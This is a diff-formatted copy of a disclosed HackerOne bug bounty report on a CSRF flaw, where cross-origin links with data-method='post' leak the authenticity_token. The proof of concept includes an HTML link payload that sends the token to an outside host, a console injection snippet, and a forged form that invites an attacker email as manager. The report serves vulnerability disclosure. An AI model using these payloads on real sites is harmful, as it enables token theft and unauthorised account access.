@@ -1,0 +1,49 @@
+ReportLink:https://hackerone.com/reports/47472
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/danlec
+ReportedTo:HackerOne(security)
+BountyAmount:2000.0
+Severity:
+State:Closed
+DateOfDisclosure:26.02.2015 21:50:46
+
+Summary:
+
+**Background**
+
+- There has been [at least one case](/reports/46072) where [an attacker](/danlec) was able to insert arbitrary HTML into a submitted report
+- HackerOne uses a very strict Content Security Policy that prevents inline script and script from other origins
+- HackerOne uses an `authenticity_token` in its POSTs to guard against CSRF attacks
+- There is a click handler for links with a`data-method` attribute that makes it so an `<a>` tag with a `data-method="post"` will send the CSRF token in a POST to the `href` of the link, **even if the target is a different origin**
+
+**Proof of concept**
+
+1.  Suppose that someone is able to find an exploit similar to #46072, allowing them to insert arbitrary HTML into a report, and they insert the following payload:
+```
+<a href="http://danlec.com" data-method="post">Proof of Concept</a>
+```
+  Since I'm not currently aware of a means of doing this, we'll have to simulate this by running the following from the console:
+```
+$(".hacktivity-container-content:first")
+ .html('<p><a href="http://danlec.com" data-method="post">Click Me!</a></p>')
+```
+  (Yes, in general security reports involving the victim running code on the console are highly suspect.  Please bear with me.)
+
+2.  When the victim clicks the link, the current `authenticity_token` is sent to <http://danlec.com>.  You can inspect the headers that are sent, or have the link be <http://httpbin.org/post> which will echo the headers that it was sent.
+
+3.  Using the `authenticity_token` it was provided, the target of the link could automatically submit a form like the following on the victim's behalf:
+```
+<form method="POST" action="https://hackerone.com/danlec-test/team_members"
+     target="_blank">
+  <input type="text" name="authenticity_token" 
+     value="authenticity_token from the POST to this page">
+  <input type="text" name="invitations_team_member[email]" 
+     value="attacker@gmail.com">
+  <input type="hidden" name="team_member[add_as_manager]" value="1">
+  <input type="hidden" name="utf8" value="✓">
+  <input type="hidden" name="commit" value="Send invite">
+  <input type="submit">
+</form>
+```
+
+It would make sense if the click handler for links with a `data-method` attribute only ran for links to URLs with the same origin, especially in situations warranting a strict Content Security Policy.
